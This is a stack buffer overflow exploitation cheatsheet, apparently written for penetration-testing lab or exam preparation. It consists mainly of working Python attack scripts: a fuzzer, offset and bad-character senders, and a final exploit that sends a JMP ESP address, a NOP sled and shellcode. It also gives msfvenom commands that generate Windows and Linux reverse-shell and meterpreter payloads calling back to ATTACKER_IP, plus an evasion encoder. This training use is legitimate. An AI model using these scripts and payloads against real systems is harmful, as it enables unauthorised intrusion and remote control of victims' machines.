# Buffer Overflow Cheatsheet

## Overview

1. Fuzz the application to crash it
2. Find the offset to EIP
3. Verify EIP control
4. Find bad characters
5. Find a JMP ESP instruction
6. Generate shellcode
7. Exploit!

---

## Step 1: Fuzzing

### Python Fuzzing Script

```python
#!/usr/bin/env python3
import socket
import sys
import time

ip = "TARGET_IP"
port = TARGET_PORT
timeout = 5

buffer = b"A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)  # Receive banner if any
            
            print(f"Sending {len(buffer)} bytes...")
            s.send(b"COMMAND " + buffer + b"\r\n")  # Modify command as needed
            s.recv(1024)
            
    except socket.error:
        print(f"Crashed at {len(buffer)} bytes!")
        sys.exit(0)
    
    buffer += b"A" * 100
    time.sleep(1)
```

---

## Step 2: Find Offset

### Generate Pattern

```bash
# Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH

# Python
msf-pattern_create -l LENGTH
```

### Find Offset

```bash
# After crash, note EIP value
# Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l LENGTH -q EIP_VALUE

# Python
msf-pattern_offset -l LENGTH -q EIP_VALUE
```

### Offset Script

```python
#!/usr/bin/env python3
import socket

ip = "TARGET_IP"
port = TARGET_PORT

# Generated pattern from pattern_create
pattern = b"Aa0Aa1Aa2..."  # Paste full pattern here

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.recv(1024)
        
        print("Sending pattern...")
        s.send(b"COMMAND " + pattern + b"\r\n")
        s.recv(1024)
        
except socket.error as e:
    print(f"Error: {e}")
```

---

## Step 3: Verify EIP Control

```python
#!/usr/bin/env python3
import socket

ip = "TARGET_IP"
port = TARGET_PORT
offset = OFFSET_VALUE  # Found in step 2

buffer = b"A" * offset
buffer += b"B" * 4  # Should overwrite EIP with 42424242
buffer += b"C" * (1000 - len(buffer))  # Padding

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.recv(1024)
        
        print("Sending buffer...")
        s.send(b"COMMAND " + buffer + b"\r\n")
        s.recv(1024)
        
except socket.error as e:
    print(f"Error: {e}")
```

**Verify:** EIP should be `42424242` (BBBB)

---

## Step 4: Find Bad Characters

### Generate Bad Chars List

```python
# All characters except null byte
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

### Bad Chars Script

```python
#!/usr/bin/env python3
import socket

ip = "TARGET_IP"
port = TARGET_PORT
offset = OFFSET_VALUE

badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = b"A" * offset
buffer += b"B" * 4
buffer += badchars

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.recv(1024)
        
        print("Sending bad chars...")
        s.send(b"COMMAND " + buffer + b"\r\n")
        s.recv(1024)
        
except socket.error as e:
    print(f"Error: {e}")
```

**In Immunity Debugger:**
1. Right-click ESP → Follow in Dump
2. Compare hex dump with expected sequence
3. Note where characters are missing/corrupted
4. Remove bad char from list and repeat

**Common Bad Characters:**
- `\x00` - Null byte (almost always bad)
- `\x0a` - Line Feed
- `\x0d` - Carriage Return
- `\x20` - Space

---

## Step 5: Find JMP ESP

### In Immunity Debugger with Mona

```
# Load mona
!mona modules

# Find JMP ESP without protections (ASLR, SafeSEH, etc.)
!mona find -s "\xff\xe4" -m MODULE_NAME

# Or find with bad chars excluded
!mona jmp -r esp -cpb "\x00\x0a\x0d"
```

### Manual Search

```
# In Immunity Debugger
Search → Sequence of Commands → FFE4
```

**Note:** Convert address to little-endian format

---

## Step 6: Generate Shellcode

### Msfvenom Payloads

```bash
# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -b '\x00\x0a\x0d' -f python -v shellcode

# Windows reverse shell (staged)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -b '\x00\x0a\x0d' -f python -v shellcode

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -b '\x00\x0a\x0d' -f python -v shellcode

# Specify encoder
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -f python -v shellcode
```

---

## Step 7: Final Exploit

```python
#!/usr/bin/env python3
import socket
import struct

ip = "TARGET_IP"
port = TARGET_PORT

# Configuration
offset = OFFSET_VALUE
jmp_esp = struct.pack("<I", 0xADDRESS)  # Little-endian format
nops = b"\x90" * 16  # NOP sled

# Bad characters: \x00\x0a\x0d (example)
# msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -b '\x00\x0a\x0d' -f python -v shellcode
shellcode = b""
shellcode += b"\xba\x..."  # Paste msfvenom output here

# Build buffer
buffer = b"A" * offset
buffer += jmp_esp
buffer += nops
buffer += shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        s.recv(1024)
        
        print(f"Sending exploit buffer ({len(buffer)} bytes)...")
        s.send(b"COMMAND " + buffer + b"\r\n")
        print("Exploit sent!")
        
except socket.error as e:
    print(f"Error: {e}")
```

---

## Immunity Debugger Commands

```
# Restart application
Ctrl+F2 or Debug → Restart

# Run
F9 or Debug → Run

# Step into
F7

# Step over
F8

# Set breakpoint
F2 or click on address

# Go to address
Ctrl+G

# Follow in dump
Right-click register → Follow in Dump

# View registers
Alt+R or View → Registers

# View stack
Alt+S or View → Stack
```

---

## Mona Commands

```
# Set working folder
!mona config -set workingfolder c:\mona\%p

# Find modules without protections
!mona modules

# Find JMP ESP
!mona find -s "\xff\xe4" -m MODULE_NAME
!mona jmp -r esp

# Find JMP ESP excluding bad chars
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# Generate byte array for bad char comparison
!mona bytearray -b "\x00"

# Compare memory with byte array
!mona compare -f c:\mona\APP\bytearray.bin -a ESP_ADDRESS

# Find SEH overwrite
!mona seh

# Find ROP gadgets
!mona rop -m MODULE_NAME
```

---

## Quick Reference

### Struct Pack Formats

```python
# Little-endian unsigned int (32-bit)
struct.pack("<I", 0x12345678)  # Returns b'\x78\x56\x34\x12'

# Little-endian unsigned short (16-bit)
struct.pack("<H", 0x1234)  # Returns b'\x34\x12'
```

### Common JMP Instructions

| Instruction | Opcode |
|-------------|--------|
| JMP ESP | \xff\xe4 |
| CALL ESP | \xff\xd4 |
| PUSH ESP; RET | \x54\xc3 |
| JMP EAX | \xff\xe0 |
| CALL EAX | \xff\xd0 |

### Shellcode Space Calculation

```
Total buffer size - Offset - EIP (4 bytes) - NOP sled = Available space

Example:
2000 - 1024 - 4 - 16 = 956 bytes for shellcode
```

---

## Troubleshooting

### Shellcode Not Executing

1. Check bad characters again
2. Increase NOP sled
3. Verify JMP ESP address is correct
4. Check DEP/ASLR status
5. Try different encoder

### Access Violation

1. Shellcode might be too large
2. Bad characters in shellcode
3. Wrong JMP ESP address

### Connection Refused

1. Listener not running
2. Firewall blocking
3. Wrong IP/Port in shellcode



